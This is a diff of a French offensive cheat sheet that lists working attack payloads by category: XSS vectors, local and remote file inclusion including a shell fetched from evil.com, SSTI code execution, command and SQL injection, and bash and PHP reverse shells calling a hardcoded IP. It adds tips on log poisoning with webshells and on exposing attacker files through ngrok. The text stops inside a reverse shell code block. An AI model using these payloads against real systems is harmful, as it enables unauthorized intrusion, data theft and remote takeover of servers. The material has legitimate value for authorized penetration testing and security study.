@@ -1,56 +1,145 @@
-# Payloads utiles - Par type d’attaque, avec explications
+#########################################################
+#              📦 PAYLOADS UTILES PAR ATTAQUE           #
+#########################################################
 
-Un payload est un petit bout de code utilisé pour tester ou exploiter une vulnérabilité.
+Un payload est un morceau de code ou d’instruction utilisé pour provoquer une réponse spécifique sur une application vulnérable.  
+Il sert à tester, confirmer ou exploiter une faille. Voici une compilation par type d’attaque avec des exemples, des conseils et des cas d’usage.
 
 ---
 
-🔸 XSS (Exécution JS côté client)
-Exemples :
+🔸 XSS - Cross Site Scripting (Exécution JavaScript côté client)
+
+📌 But :
+- Exécuter du code JavaScript dans le navigateur de la victime.
+- Vol de cookies, redirection malveillante, keylogger, etc.
+
+🧪 Exemples :
 - <script>alert(1)</script>
 - <img src=x onerror=alert('XSS')>
 - <svg/onload=alert(1)>
+- <iframe src="javascript:alert(1)">
+- <body onload=alert(1)>
+- <math><mi//xlink:href="data:x,<script>alert(1)</script>"></math>
 
-Utilisation :
-- Champs de formulaire, commentaires, URL
+🎯 Utilisation :
+- Champs de formulaire, recherche, URL, commentaires...
+- Injection dans une page HTML non échappée
+
+🛠️ Conseils :
+- Tester dans les champs reflétés dans le DOM ou en sortie
+- Vérifier les protections CSP / filtrages côté serveur
+- Utiliser `XSStrike`, `Dalfox`, ou Burp Collaborator pour aller plus loin
 
 ---
 
-🔸 LFI (Lecture de fichier local)
-Exemples :
+🔸 LFI - Local File Inclusion (Lecture de fichiers locaux)
+
+📌 But :
+- Lire un fichier local sur le serveur via un paramètre vulnérable.
+
+🧪 Exemples :
 - ../../../../etc/passwd
+- ../../../../boot.ini
 - php://filter/convert.base64-encode/resource=index.php
 - /proc/self/environ
+- ../../../../../var/log/apache2/access.log
 
-Utilisation :
-- Inclusion de fichiers via un paramètre d’URL : page.php?file=
+🎯 Utilisation :
+- Paramètres d’URL du type : `index.php?page=`
+- Faille souvent trouvée sur les CMS ou panels maison
 
----
-
-🔸 SSTI (Injection de template côté serveur)
-Exemples :
-- {{7*7}} (Jinja2)
-- {{self.__init__.__globals__.os.system('ls')}}
-
-Utilisation :
-- Champs calculés dynamiquement, systèmes de templating
+🛠️ Conseils :
+- Tester aussi les extensions ajoutées : ?page=../../etc/passwd%00
+- Injecter une webshell dans un log, puis inclure le log (Log Poisoning)
+- Sur PHP, utiliser `php://filter` pour lire du code source encodé
 
 ---
 
-🔸 Command Injection
-Exemples :
+🔸 RFI - Remote File Inclusion
+
+📌 But :
+- Inclure et exécuter un fichier distant sur le serveur
+
+🧪 Exemples :
+- http://evil.com/shell.txt
+- http://your-ip/xss.js
+
+🎯 Utilisation :
+- Comme LFI, mais si `allow_url_fopen` ou `allow_url_include` sont activés (PHP)
+
+🛠️ Conseils :
+- Créer un serveur simple avec `python3 -m http.server`
+- Utiliser un tunnel `ngrok` ou `serveo` pour exposer des fichiers depuis ta machine
+
+---
+
+🔸 SSTI - Server Side Template Injection
+
+📌 But :
+- Injecter du code dans un moteur de template côté serveur
+
+🧪 Exemples :
+- {{7*7}} → renvoie 49
+- {{ self.__init__.__globals__.os.popen("ls").read() }}
+- {% for c in [1,2,3] %}{{c}}{% endfor %}
+
+🎯 Utilisation :
+- Champs dynamiques dans des pages générées côté serveur
+- Systèmes de templating mal sécurisés (Jinja, Twig, Velocity, Handlebars…)
+
+🛠️ Conseils :
+- Déterminer le moteur avec des tests simples
+- Utiliser `tplmap` pour exploitation avancée
+
+---
+
+🔸 Command Injection - Exécution de commandes système
+
+📌 But :
+- Exécuter des commandes shell via un champ non filtré
+
+🧪 Exemples :
 - ; whoami
 - && id
-- `uname -a`
+- | ls -la
+- `cat /etc/passwd`
+- $(uname -a)
 
-Utilisation :
-- Champs utilisés dans une commande (ping, mail, etc.)
+🎯 Utilisation :
+- Formulaire qui ping une IP, sauvegarde un fichier, fait une recherche système
+
+🛠️ Conseils :
+- Injecter aussi via les headers : User-Agent, Cookie
+- Analyser le retour de commande ou l’impact sur l’application
 
 ---
 
-🔸 Reverse Shell (Prise de contrôle distante)
-Exemples :
-- bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
-- php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+🔸 SQL Injection - Manipulation de requêtes SQL
 
-Utilisation :
-- Si une exécution de commande est possible
+📌 But :
+- Lire ou modifier des données dans une base SQL via une faille d’injection
+
+🧪 Exemples :
+- ' OR 1=1 --
+- admin' --
+- ' UNION SELECT null, user(), version() --
+
+🎯 Utilisation :
+- Champs de login, recherche, filtres, ID dans URL
+
+🛠️ Conseils :
+- Tester aussi dans les cookies, headers, et méthodes POST
+- Utiliser `sqlmap` pour l'automatiser, y compris sur des requêtes POST ou avec cookie/session
+
+---
+
+🔸 Reverse Shell - Obtenir un accès distant
+
+📌 But :
+- Obtenir un accès shell interactif depuis la cible vers ton PC (Kali)
+
+🧪 Exemples :
+
+**Bash** :
+```bash
+bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
